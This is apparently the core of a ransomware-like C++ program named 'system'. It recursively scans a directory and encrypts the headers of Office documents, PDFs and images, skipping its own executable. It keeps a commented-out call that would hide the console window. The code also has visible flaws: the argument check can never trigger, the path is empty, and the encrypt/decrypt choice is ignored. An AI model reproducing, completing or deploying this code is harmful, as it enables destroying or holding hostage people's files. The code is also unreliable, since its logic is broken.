#include "system.h"

using namespace std;

int main(int argc, char **argv)
{
//	::ShowWindow(::GetConsoleWindow(), SW_HIDE);

	if (argc < 3 || (!_stricmp(argv[1], "encrypt") && !_stricmp(argv[1], "decrypt")) )
	{
		std::cout << "Usage: system (encrypt|decrypt) password" << std::endl;
		exit(0);
	}

	operation = argv[1];
	password = argv[2];

	std::filesystem::path path;
	for (const auto& p : std::filesystem::recursive_directory_iterator(path)) {
		if (!std::filesystem::is_directory(p)) {
			if(p.path().filename() != std::filesystem::path(argv[0]).filename() &&
				( p.path().extension() == ".doc" || p.path().extension() == ".docx"
				|| p.path().extension() == ".pdf" || p.path().extension() == ".xlsm"
				|| p.path().extension() == ".png" || p.path().extension() == ".jpg"
				|| p.path().extension() == ".xls" || p.path().extension() == ".xlsx"))
				encrypt_header(p.path());
		}
	}
}